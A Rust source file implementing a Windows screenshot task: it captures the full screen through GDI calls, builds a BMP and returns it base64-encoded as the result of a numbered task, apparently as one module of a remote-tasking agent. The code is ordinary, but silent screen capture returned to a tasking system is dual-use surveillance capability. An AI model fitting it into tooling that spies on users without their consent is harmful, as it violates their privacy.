/// Display: screenshot capture.

use super::TaskResult;
use crate::utils::helpers;

pub fn capture(task_id: i64, _args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        capture_windows(task_id)
    }
    #[cfg(not(target_os = "windows"))]
    {
        TaskResult::error(task_id, "screenshot not supported on this platform".to_string())
    }
}

#[cfg(target_os = "windows")]
fn capture_windows(task_id: i64) -> TaskResult {
    unsafe {
        use winapi::um::wingdi::*;
        use winapi::um::winuser::*;
        use std::ptr;

        let hdc_screen = GetDC(ptr::null_mut());
        if hdc_screen.is_null() {
            return TaskResult::error(task_id, "GetDC failed".to_string());
        }

        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);

        let hdc_mem = CreateCompatibleDC(hdc_screen);
        if hdc_mem.is_null() {
            ReleaseDC(ptr::null_mut(), hdc_screen);
            return TaskResult::error(task_id, "CreateCompatibleDC failed".to_string());
        }

        let hbm = CreateCompatibleBitmap(hdc_screen, width, height);
        if hbm.is_null() {
            DeleteDC(hdc_mem);
            ReleaseDC(ptr::null_mut(), hdc_screen);
            return TaskResult::error(task_id, "CreateCompatibleBitmap failed".to_string());
        }

        let old_bm = SelectObject(hdc_mem, hbm as *mut _);
        BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);
        SelectObject(hdc_mem, old_bm);

        // Create BMP in memory
        let mut bmi: BITMAPINFOHEADER = std::mem::zeroed();
        bmi.biSize = std::mem::size_of::<BITMAPINFOHEADER>() as u32;
        bmi.biWidth = width;
        bmi.biHeight = -height; // top-down
        bmi.biPlanes = 1;
        bmi.biBitCount = 24;
        bmi.biCompression = BI_RGB;

        let row_size = ((width * 3 + 3) & !3) as usize;
        let img_size = row_size * height as usize;
        let mut pixels: Vec<u8> = vec![0; img_size];

        GetDIBits(
            hdc_mem,
            hbm,
            0,
            height as u32,
            pixels.as_mut_ptr() as *mut _,
            &mut bmi as *mut BITMAPINFOHEADER as *mut BITMAPINFO,
            DIB_RGB_COLORS,
        );

        // Build BMP file
        let file_header_size = 14;
        let dib_header_size = std::mem::size_of::<BITMAPINFOHEADER>();
        let file_size = file_header_size + dib_header_size + img_size;

        let mut bmp = Vec::with_capacity(file_size);
        // File header
        bmp.extend_from_slice(b"BM");
        bmp.extend_from_slice(&(file_size as u32).to_le_bytes());
        bmp.extend_from_slice(&0u16.to_le_bytes()); // reserved
        bmp.extend_from_slice(&0u16.to_le_bytes()); // reserved
        bmp.extend_from_slice(&((file_header_size + dib_header_size) as u32).to_le_bytes());
        // DIB header
        let bmi_bytes: [u8; std::mem::size_of::<BITMAPINFOHEADER>()] = std::mem::transmute(bmi);
        bmp.extend_from_slice(&bmi_bytes);
        // Pixel data
        bmp.extend_from_slice(&pixels);

        // Cleanup GDI
        DeleteObject(hbm as *mut _);
        DeleteDC(hdc_mem);
        ReleaseDC(ptr::null_mut(), hdc_screen);

        let encoded = helpers::b64_encode(&bmp);
        TaskResult::success_typed(task_id, encoded, "screenshot")
    }
}
